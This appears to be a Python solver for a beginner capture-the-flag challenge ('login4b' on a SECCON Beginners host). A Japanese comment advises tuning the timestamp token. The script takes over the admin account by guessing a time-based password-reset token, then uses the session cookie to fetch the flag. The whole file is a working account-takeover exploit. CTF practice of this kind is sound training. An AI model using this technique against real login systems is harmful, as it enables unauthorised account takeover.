# 注意: ネットワーク環境によってはこのsolverが動かないことがあります。その場合は'token': int(time.time())の値を調整してください。
import requests
import time

ENDPOINT = 'http://login4b.challenges.beginners.seccon.jp'

headers = {
    'Accept': '*/*',
    'Content-Type': 'application/json',
}

data = {
    'username': 'admin',
    'token': int(time.time()),
    'newPassword': 'testtesttest'
}
print("token:", data['token'])

response = requests.post( f'{ENDPOINT}/api/reset-request', headers=headers, json=data)
response = requests.post( f'{ENDPOINT}/api/reset-password', headers=headers, json=data)

if response.status_code == 200:
    session_cookies = response.cookies.get_dict()
    print("Session Cookies:", session_cookies)

    flag_response = requests.get(f'{ENDPOINT}/api/get_flag', cookies=session_cookies)

    if flag_response.status_code == 200:
        print("Flag Response:", flag_response.text)
    else:
        print("Failed to retrieve flag:", flag_response.status_code)
else:
    print("Failed to reset password:", response.status_code)